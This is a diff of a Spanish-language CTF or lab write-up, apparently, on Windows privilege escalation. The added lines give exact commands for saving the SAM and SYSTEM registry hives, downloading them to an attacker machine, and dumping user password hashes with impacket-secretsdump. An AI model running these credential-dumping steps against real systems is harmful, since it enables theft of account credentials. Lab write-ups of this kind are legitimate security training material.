@@ -258,10 +258,14 @@ Buscamos en el navegador como abusar de el, encontramos un repositorio de github
 
 En el que se explica paso por paso la escalada de privilegios
 
-Primero deberemos crear un directorio `/temp`
+Primero deberemos crear un directorio `/temp` con `mkdir C:\temp`
 
-Segundo se copia la `sam` al directorio `/temp` que hemos creado yde `system` guardándolo en local en nuestro `/temp`
-Tercero con im
+Segundo se copia la `sam` al directorio `/temp` que hemos creado yde `system` guardándolo en nuestro `/temp` con `reg save hklm\sam C:\temp\sam.hive`
+y con `reg save hklm\system C:\temp\system.hive`
+
+Tercero pasamos el archivo `sam` y `system`  a nuestra maquina atacante con `download sam.hive` y con  `download system.hive`para poder coger los hashes de los usuarios actuales con `impacket-secretsdump -sam sam.hive -system system.hive LOCAL`
+
+
 
 
 
